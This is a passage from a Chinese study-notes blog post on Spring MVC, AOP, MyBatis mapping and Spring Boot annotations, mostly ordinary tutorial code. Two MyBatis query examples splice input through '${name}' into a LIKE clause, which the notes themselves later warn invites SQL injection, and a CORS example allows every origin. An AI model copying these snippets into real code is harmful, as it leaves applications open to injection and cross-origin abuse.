href="https://blog.csdn.net/eson_15/article/details/51689023" target="_blank" rel="noopener">参考</a></p><img src="../images/java_web/image-20210407121859423.png" alt="image-20210407121859423" style="zoom:200%;" /><p>处理映射器 HanderMapping(不需要程序员开发)</p><p>作用:  根据请求的url查找Header </p><ol start="3"><li><p>处理器适配器 HandlerAdapter(不需要开发)<br>作用: 按照特定规则(HandlerAdapter 要求的规则) 去执行Handler</p></li><li><p>处理器Handler<code>(需要开发</code>)<br>注意: 编写Handler 时按照HandlerAdapter 的要求去做, 这样适配器才可以正确执行 Handler </p></li><li><p>视图 Vier(需要开发jsp)</p><p> View是一个接口, 实现类支持不同的View 类型(jsp, freemarker, pdf)</p><p> [注] 不需要开发的, 需要自己做一下配置</p></li></ol><h5 id="HandlerMapping"><a href="#HandlerMapping" class="headerlink" title="HandlerMapping"></a>HandlerMapping</h5><p>处理器映射器  将bean的name 作为url进行查找, 也就是说在配置 Hander时需要在其 bean 中加入name </p><p>例  </p><p>handler </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">name</span>=<span class="string">"/my_url"</span> <span class="attr">class</span>=<span class="string">"location.Controller"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>hanlerMapping</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping/&gt;</span></span></span><br></pre></td></tr></table></figure><p>HandlerAdapter</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p> 以上三条配置 都要在 mvc-servlet.xml文件中配置 </p><h5 id="InternalResourceViewResoulver"><a href="#InternalResourceViewResoulver" class="headerlink" title="InternalResourceViewResoulver"></a>InternalResourceViewResoulver</h5><p>试图解析器 可以不做任何限制 ,</p><p>也可以添加 标签配置 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/jsp/"</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>常用配置为上面 </p><p>配置”sufiix”后 对jsp文件引用时不需要 在加上.jsp 和 /WEB-INF/jsp/ 文件目录 </p><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p><a href="https://blog.csdn.net/suifeng3051/article/details/51659731" target="_blank" rel="noopener">参考</a></p><p>对于图片, 视频等二进制数据处理需要用到myltipart表单,  multipart表单和上面介绍的普通表单不同，它会把表单分割成块，表单中的每个字段对应一个块，每个块都有自己的数据类型。也就是说，对于上传字段对应的块，它的数据类型就可以是二进制了：</p><p>现文件上传，其实就是解析一个Mutipart请求。DispatchServlet自己并不负责去解析mutipart 请求，而是委托一个实现了<code>MultipartResolver</code>接口的类来解析mutipart请求。 spring3.1后提供了两个现成的MultipartResolver 接口的实现类</p><p>添加bean</p><bean id="multipartResolver" class="org.springframework.web.multipart.support.StandardServletMultipartResolver"/> <p>配置Dispatchcher <img src="../images/java_web/image-20210415214735719.png" alt="image-20210415214735719"></p><p>@Conroller 层</p><p> File.separator 静态变量   代表 系统目录中的分隔符</p><p>pathSeparatorChar<br>public static final char pathSeparatorChar</p><p>与系统有关的路径分隔符。此字段被初始为包含系统属性 path.separator 值的第一个字符。此字符用于分隔以路径列表 形式给定的文件序列中的文件名。在 UNIX 系统上，此字段为 ‘:’；在 Microsoft Windows 系统上，它为 ‘;’。</p><p>pathSeparator<br>public static final String pathSeparator</p><p>与系统有关的路径分隔符，为了方便，它被表示为一个字符串。此字符串只包含一个字符，即 pathSeparatorChar。</p><h4 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h4><p>同一协议，同一ip，同一端口，三同中有一不同就产生了跨域。</p><h5 id="后端解决"><a href="#后端解决" class="headerlink" title="后端解决"></a>后端解决</h5><p>在Cpntroller 类上添加一个@CrossOrigin 注解(允许所有ip跨域访问) 就可以实现对当前controller的跨域访问,  也可以在方法上使用</p><p>或者 CSRF(Cross-site request forgey) , 跨站请求维造 ,也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p><p>建立跨域配置文件</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@Configuration</span><br><span class="line">public class CorsConfiguration &#123;</span><br><span class="line">    @Bean</span><br><span class="line">    public WebMvcConfigurer corsConfigurer() &#123;</span><br><span class="line">        return new WebMvcConfigurer() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void addCorsMappings(CorsRegistry registry) &#123;</span><br><span class="line">                registry.addMapping(<span class="string">"/**"</span>)</span><br><span class="line">                        .allowCredentials(false)</span><br><span class="line">                        .allowedMethods(<span class="string">"<span class="keyword">POST</span>"</span>, <span class="string">"<span class="keyword">GET</span>"</span>, <span class="string">"<span class="keyword">PUT</span>"</span>, <span class="string">"<span class="keyword">OPTIONS</span>"</span>, <span class="string">"<span class="keyword">DELETE</span>"</span>)</span><br><span class="line">                        .allowedOrigins(<span class="string">"*"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><h4 id="Component"><a href="#Component" class="headerlink" title="@Component"></a>@Component</h4><p>把普通pojo实例化spring容器中</p><p>泛指各种组件, 党我们的类不属于各种归类的时候(不属于@Controller . @Service等),我们可以使用Component标注这个类 </p><h4 id="ComponentScan"><a href="#ComponentScan" class="headerlink" title="@ComponentScan"></a>@ComponentScan</h4><p>主要用发是扫描指定的包下面的bean对象  , 可以配置多个 </p><p>springboot默认扫描启动类所在的包下面的所有bean , 还需要额外可以指定别的package ,需要新增ComponentScan, 手动指定springboot所在类的package的路径, 要不然不会被加载 </p><h3 id="Spring-AOP"><a href="#Spring-AOP" class="headerlink" title="Spring AOP"></a>Spring AOP</h3><p><a href="https://www.jianshu.com/p/994027425b44" target="_blank" rel="noopener">参考</a></p><p>首先，在面向切面编程的思想里面，把功能分为核心业务功能，和周边功能。</p><ul><li><strong>所谓的核心业务</strong>，比如登陆，增加数据，删除数据都叫核心业务</li><li><strong>所谓的周边功能</strong>，比如性能统计，日志，事务管理等等</li></ul><p>周边功能在Spring的AOP思想里,被定义为切面</p><p>核心功能和切面功能分别独立进行开发, 然后把切面功能和核心业务功能”编织”在一起,叫AOP</p><p>AOP 当中的概念：</p><ul><li>切入点（Pointcut）<br>   在哪些类，哪些方法上切入（<strong>where</strong>）</li><li>通知（Advice）<br>   在方法执行的什么实际（<strong>when:</strong>方法前/方法后/方法前后）做什么（<strong>what:</strong>增强的功能）</li><li>切面（Aspect）<br>   切面 = 切入点 + 通知，通俗点就是：<strong>在什么时机，什么地方，做什么增强！</strong></li><li>织入（Weaving）<br>   把切面加入到对象，并创建出代理对象的过程。（由 Spring 来完成）</li></ul><p>选择好连接点后可以创建切面, 可以把切面理解为一个拦截器 , 当程序运行到连接点的时候, 被拦截下来, 在开头加入了初始化的方法, 在结尾加入了销毁的方法而已 , 在Spring 中只要使用@Aspect注解一个类 , 那么Spring Ioc容器就会认为这是一个切面了 </p><p>被定义为切面的类仍然是一个Bean, 需要@Component 注解标注 </p><table><thead><tr><th align="left">注解</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>@Before</code></td><td align="left">前置通知，在连接点方法前调用</td></tr><tr><td align="left"><code>@Around</code></td><td align="left">环绕通知，它将覆盖原有方法，但是允许你通过反射调用原有方法，后面会讲</td></tr><tr><td align="left"><code>@After</code></td><td align="left">后置通知，在连接点方法后调用</td></tr><tr><td align="left"><code>@AfterReturning</code></td><td align="left">返回通知，在连接点方法执行并正常返回后调用，要求连接点方法在执行过程中没有发生异常</td></tr><tr><td align="left"><code>@AfterThrowing</code></td><td align="left">异常通知，当连接点方法异常时调用</td></tr></tbody></table><p>定义切点  execution正则表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execution(*pojo.Landlord.service())</span><br></pre></td></tr></table></figure><ul><li>execution：代表执行方法的时候会触发</li><li><code>*</code> ：代表任意返回类型的方法</li><li>pojo.Landlord：代表类的全限定名</li><li>service()：被拦截的方法名称</li></ul><p>通过execution表达式,Spring会知道应该拦截pojo.Landlord类下的service()方法. </p><p>可以通过使用@Pointcut注解来定义一个切点来解决需要写多个表达式的麻烦</p><h4 id="环绕通知"><a href="#环绕通知" class="headerlink" title="环绕通知"></a>环绕通知</h4><p>AOP中最强大的通知, 因为它集成了前置通知和后置通知,保留了连接点原有的方法的功能, 强大又灵活 </p><h3 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h3><p><a href="https://juejin.cn/post/6844903555145400328#heading-13" target="_blank" rel="noopener">参考</a></p><p>基本构成</p><p><img src="../images/java_web/16128007e21a883f.png" alt="img"></p><ul><li>SqlSessionFactoryBuilder </li></ul><p>SqlSessionFactoryBuilder通常利用XML或者Java编码来构建SqlSessionFactory，一旦我们构建了SqlSessionFactory，它的作用也就完结了。上面的例子中也就是简单的读取配置文件，转化为流对象，再创建出SqlSessionFactory。因为它的主要目的是创建SqlSessionFactory，所以它一般也只存活在创建的那个方法里，声明周期很短。</p><ul><li>SqlSessionFactory</li></ul><p>SqlSessionFactory是一个工厂类，它的作用就是生产SqlSession，而SqlSession你可以想象成JDBC里的一个Connection，每次访问数据库都需要一个SqlSession，所以SqlSessionFactory通常伴随整个Mybatis的生命周期，我们通常为一个数据库创建一个SqlSessionFactory，因为如果创建多个，那么每次创建新的，它都会附带着打开一堆Connection资源，所以通常我们使用单例模式管理SqlSessionFactory。</p><ul><li>Mapper</li></ul><p>Mapper也就是上面我们写的<code>CommodityDao commodityDao = sqlSession.getMapper(CommodityDao.class);</code>,我们仅仅使用Java接口和一个XML文件（或者注解）去实现Mapper而不用实现类，其实这里运用到了动态代理，Mybatis会为接口生成代理类对象，代理对象会根据“接口路径+方法名”去匹配，找到对应的XML文件（或注解）去完成它所需要的任务，返回我们需要的结果。Mapper是一个方法级别的东西，它的最大生命周期应该和SqlSession是相同的。</p><h4 id="输入映射"><a href="#输入映射" class="headerlink" title="输入映射"></a>输入映射</h4><p>为 接口方法传入参数, 参数与sql语句中的参数保持一致 </p><p>当只有一个参数时 , 只需要在方法中设定参数 , 如果需要传递多个参数, 就需要用到输入映射 </p><p>单个参数时 Mybatis 会帮助我们完成自动映射, 只要返回的SQL列名和JavaBean的属性一致, Mybatis就可以帮助我们自动回填这些字段而无需任何配置 , 可以在Mybatis的配置文件里,通过autoMappingBehavior 来设置自动映射, 它包含3个值：</p><ul><li><strong>NONE</strong>：取消自动映射</li><li><strong>PARTIAL</strong>：这也是默认值，只会自动映射，没有定义嵌套结果集映射的结果集</li><li><strong>FULL</strong>：会自动映射任意复杂的结果集（无论是否嵌套）</li></ul><p>传递多个参数通常由3种方式 ,通过Map,通过注解, 通过POJO对象 </p><h5 id="通过Map"><a href="#通过Map" class="headerlink" title="通过Map"></a>通过Map</h5><p>假设我们想查询带有<strong>饼</strong>的食物，并且价格低于80的。那么我们可以这么写SQL语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"getCommodityByMap"</span> <span class="attr">parameterType</span>=<span class="string">"map"</span> <span class="attr">resultType</span>=<span class="string">"com.shuqing28.pojo.Commodity"</span>&gt;</span></span><br><span class="line">                SELECT * FROM commodity WHERE name like '%$&#123;name&#125;%' AND price<span class="symbol">&amp;lt;</span>#&#123;price&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>mybatis使用xml定义Mapper,所以’&lt;’ 使用了转义符 <code>&amp;lt;</code>表示 parameterType(参数类型) 定义为map  ,接口也介意Map为参数 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">List&lt;Commodity&gt; <span class="title">getCommodityByMap</span><span class="params">(Map&lt;String, Object&gt; params)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CommodityDao commodityDao = sqlSession.getMapper(CommodityDao<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">Map&lt;String, Object&gt; paramsMap = <span class="keyword">new</span> HashMap&lt;String , Object&gt;();</span><br><span class="line">paramsMap.put(<span class="string">"name"</span>, <span class="string">"饼"</span>);</span><br><span class="line">paramsMap.put(<span class="string">"price"</span>, <span class="number">80.0</span>);</span><br><span class="line">List&lt;Commodity&gt; commodities = commodityDao.getCommodityByMap(paramsMap);</span><br></pre></td></tr></table></figure><p>Map 需要一项项指定Key的名字, 不方便 </p><h5 id="注解方式"><a href="#注解方式" class="headerlink" title="注解方式"></a>注解方式</h5><p>注解方式使用了<strong>@Param</strong>注解 ,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">List&lt;Commodity&gt; <span class="title">getCommodityByAnnation</span><span class="params">(@Param(<span class="string">"name"</span>)</span> String name, @<span class="title">Param</span><span class="params">(<span class="string">"price"</span>)</span> Double price)</span>;</span><br></pre></td></tr></table></figure><p>根据 @Param提供的名称, 把变量值传入到Sql语句种对应的参数中, 可读性提高, 适合于参数不多的情况 </p><h5 id="POJO-传递"><a href="#POJO-传递" class="headerlink" title="POJO 传递"></a>POJO 传递</h5><p>通常我们只需要传递简单的POJO对象, 比如 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"getCommodityByPOJO"</span> <span class="attr">parameterType</span>=<span class="string">"com.shuqing28.pojo.Commodity"</span> <span class="attr">resultType</span>=<span class="string">"com.shuqing28.pojo.Commodity"</span>&gt;</span></span><br><span class="line">    SELECT * FROM commodity WHERE name like '%$&#123;name&#125;%' AND price<span class="symbol">&amp;lt;</span>#&#123;price&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>id</strong>标识了这条sql，id与接口名保持一致</li><li><strong>parameterType</strong>定义参数类型，这里就是int</li><li><strong>resultType</strong>定义了返回值类型，这里是我们定义的POJO类</li></ul><p>测试 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getLowPriceCommodityByPOJO</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SqlSession sqlSession = sqlSessionFactory.openSession();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        CommodityDao commodityDao = sqlSession.getMapper(CommodityDao<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Commodity commodity = <span class="keyword">new</span> Commodity();</span><br><span class="line">        commodity.setName(<span class="string">"饼"</span>);</span><br><span class="line">        commodity.setPrice(<span class="number">80.0</span>);</span><br><span class="line">        List&lt;Commodity&gt; commodities = commodityDao.getCommodityByPOJO(commodity);</span><br><span class="line">        System.out.println(commodities);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过别名减少名称的长度 , 需要在 mybatis-config.xml中的configuration 中定义</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">typeAlias</span> <span class="attr">alias</span>=<span class="string">"commodity"</span> <span class="attr">type</span>=<span class="string">"com.shuqing28.pojo.Commodity"</span> /&gt;</span>  <span class="comment">&lt;!--your.class.location--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以用commodity替换 ,但不能有重名</p><h5 id="和-的区别"><a href="#和-的区别" class="headerlink" title="#和$的区别"></a>#和$的区别</h5><p>Mybatis本身是基于JDBC封装的. 所以#{para}是预编译处理(PreparedStatement) . 相当于 原来的 ?, 而${para}是字符串替换, Mybatis在处理#时, 会调用PreparedStatement 的set系列 方法来赋值; 处理$时, 就是把${para}替换成变量的值. #方式能够很大程度防止slq 注入, $方式一般用于传入数据库对象, 例如传入表名, 一般能用#的就别用$</p><h4 id="输出映射"><a href="#输出映射" class="headerlink" title="输出映射"></a>输出映射</h4><p>Mybatis 的输出映射分两种, resultType和resultMap  </p><h5 id="resultType"><a href="#resultType" class="headerlink" title="resultType"></a>resultType</h5><p>可以是简单类型,或者POJO对象或者列表   </p><h5 id="单个对象"><a href="#单个对象" class="headerlink" title="单个对象"></a>单个对象</h5><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Commodity getCommodityById(<span class="name">Integer</span> id)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>Mybatis根据接口返回值判断返回一条对象，如果用过ibatis的可以知道内部调用了session.selectOne。</p><h5 id="返回列表"><a href="#返回列表" class="headerlink" title="返回列表"></a>返回列表</h5><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Commodity&gt; getCommodityByPOJO(<span class="name">Commodity</span> commodity)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>内部使用session.selectList，Mapper接口使用<code>List&lt;XXX&gt;</code>作为返回值。</p><p>查询出来的列名和POJO属性只要有一个一致就会创建POJO对象, 最多别的字段为默认值 ,但如果全部不一致, 就不会创建该POJO对象 </p><h5 id="resultMap"><a href="#resultMap" class="headerlink" title="resultMap"></a>resultMap</h5><p>上面的resultType在查询的列名和POJO属性值一致的时候才可以映射成功，如果不一致的话，就需要resultMap登场表演了。</p><p>如果查询出来的列名和POJO的属性名不一致，通过定义一个resultMap对列名和POJO属性名之间作一个映射关系。</p><p>在使用resultMap前我们需要定义resultMap 假设我们查询商品类的两个字段id和name，但是查询的时候定义为<code>id_</code>和<code>name_</code>。列名和属性名不一致了，先定义resultMap</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;resultMap <span class="built_in">id</span>=<span class="string">"commodityResultMap"</span> type=<span class="string">"commodity"</span>&gt;</span><br><span class="line">    &lt;<span class="built_in">id</span> column=<span class="string">"id_"</span> <span class="keyword">property</span>=<span class="string">"id"</span>/&gt;</span><br><span class="line">    &lt;<span class="literal">result</span> column=<span class="string">"name_"</span> <span class="keyword">property</span>=<span class="string">"name"</span>/&gt;</span><br><span class="line">    &lt;/resultMap&gt;</span><br></pre></td></tr></table></figure><p>其中</p><ul><li><strong>id</strong>标识这个resultMap</li><li><strong>type</strong>标识映射哪个POJO里面的属性，这里因为上面说过别名了，所以就是映射的Commodity这个POJO</li><li><strong>id</strong>元素标识这个对象的主键，result就是普通字段</li><li><strong>property</strong>代表POJO的属性名称</li><li><strong>column</strong>表示数据库SQL的列名</li></ul><p>再看我们的select元素：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">select</span> id="getCommodityByPrice" parameterType="double" resultMap="commodityResultMap"&gt;</span><br><span class="line">       <span class="keyword">SELECT</span> id id_, <span class="type">name</span> name_ <span class="keyword">FROM</span> <span class="keyword">USER</span> <span class="keyword">WHERE</span> price=#&#123;price&#125;</span><br><span class="line">&lt;/<span class="keyword">select</span>&gt;</span><br></pre></td></tr></table></figure><p>使用resultType进行输出映射时，只有查询出来的列名和pojo中的属性名一致，该列才可以映射成功。如果查询出来的列名和pojo的属性名不一致，通过定义一个resultMap对列名和pojo属性名之间作一个映射关系。 此外，resultMap还可以做一对多、多对多等高级映射</p><h4 id="高级映射"><a href="#高级映射" class="headerlink" title="高级映射"></a>高级映射</h4><p><a href="https://juejin.cn/post/6844903558488277006" target="_blank" rel="noopener">https://juejin.cn/post/6844903558488277006</a></p><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a>toString()</h4><p>在使用实体类对象接受到数据库中数据时, 最好把pojo中实体类 都加上toString() 方法, 方便对对象中内容的输出, 否则会输出对象的地址</p><p>没加<img src="../images/java_web/image-20210421212203811.png" alt="image-20210421212203811"></p><p>加上后</p><p><img src="../images/java_web/image-20210421212248441.png" alt="image-20210421212248441"></p><p>通过Debug调试</p><p><img src="../images/java_web/image-20210421212418740.png" alt="image-20210421212418740"></p><p>以上没加toString() 方法</p><p>加了后 ,方便对数据的读取 </p><p><img src="../images/java_web/image-20210421212520909.png" alt="image-20210421212520909"></p><h4 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h4><p>基于xml的 sql可以加入标签进行 sql语句的定义和 去掉重复的代码, 实现 sql语句的动态性 </p><h4 id="在boot中配置xml路径"><a href="#在boot中配置xml路径" class="headerlink" title="在boot中配置xml路径"></a>在boot中配置xml路径</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mybatis.mapper-locations</span>=classpath:mapper/*.xml</span><br></pre></td></tr></table></figure><h2 id="spring-boot"><a href="#spring-boot" class="headerlink" title="spring boot"></a>spring boot</h2><p> 开始学习时间2021.4.18  立下 flag  5.28之间整体结构理清并写出一个web项目 </p><p>完成大作业并 在期末考试前面试暑期实习  4 级考试 </p><p>SpringBoot 默认只扫描 启动类() main) 所在包, </p><h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h3><p>controller package和其它package在无配置注解扫描的情况下应该和 Application在同级目录下 </p><h4 id="配置-yml文件"><a href="#配置-yml文件" class="headerlink" title="配置 yml文件"></a>配置 yml文件</h4><p>使用.yml文件作为springboot 中 .properties文件的替代 </p><p>pom中加入依赖</p><p><img src="../images/java_web/image-20210420195618627.png" alt="image-20210420195618627"></p><h4 id="resources"><a href="#resources" class="headerlink" title="resources"></a>resources</h4><p>templates 文件夹下存放的为模板文件,  可以通过 @Controller层 return  “name” 访问 </p><p>name.html 文件  </p><p>需要加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="templates文件夹"><a href="#templates文件夹" class="headerlink" title="templates文件夹"></a>templates文件夹</h4><p>存放springbot的动态页面 </p><p>通过@controller 访问到 template下的html页面 </p><p>使用 Thymeleaf 语法写 页面</p><h3 id="配置注解"><a href="#配置注解" class="headerlink" title="配置注解"></a>配置注解</h3><h4 id="将类声明为Bean对象"><a href="#将类声明为Bean对象" class="headerlink" title="将类声明为Bean对象"></a>将类声明为Bean对象</h4><p>@Component :  不确定组件   比如pojo 实例化到spring容器  作用域默认为singleton</p><p>@Service : 业务逻辑层(Service层)使用 </p><p>@Repositpry 在数据访问层(dao层)使用 </p><p>@Controller 用于标注控制层组件 </p><p>@RestConroller  作用近似于 @Controller + @ResponseBody </p><h4 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br></pre></td></tr></table></figure><p>@Controller 和 @Response 注解的结合 ,返回json对象</p><p>后端与前端分离 , 一般后端返回的为 json对象, 前端通过框架处理 json数据显示在页面上 </p><h4 id="RequestMapping-1"><a href="#RequestMapping-1" class="headerlink" title="@RequestMapping"></a>@RequestMapping</h4><p>配置在类上的映射要在类内方法的前面</p><p>如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"index"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/test"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"test"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = &#123;<span class="string">"/Variavle/&#123;id&#125;"</span>&#125; ,method= RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUrlVariable</span><span class="params">(@PathVariable(<span class="string">"id"</span>)</span>Integer id) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"id"</span>+id;</span><br><span class="line">     <span class="comment">//   return "hello world";</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/hello"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问 index() 方法的页面要通过 localhost:8080/index/test   web的根url 为 “ / “  , 一般method 选择 get/post</p><h5 id="处理web请求参数的注解"><a href="#处理web请求参数的注解" class="headerlink" title="处理web请求参数的注解"></a>处理web请求参数的注解</h5><ul><li>@PathVariable 获取url地址中的数据 /name/id    </li></ul><ul><li>@RequestParam   获取请求参数的值   /name?id= </li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">@RequestParam</span>(name=<span class="string">"user"</span>,<span class="keyword">default</span>=<span class="string">"xxx初始化"</span>)<span class="built_in">String</span> user</span><br></pre></td></tr></table></figure><p>使用 map 接收多个map类型 </p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(<span class="string">"test"</span>)</span><br><span class="line">public  <span class="built_in">String</span> login(<span class="meta">@RequestParam</span> <span class="built_in">Map</span> &lt;<span 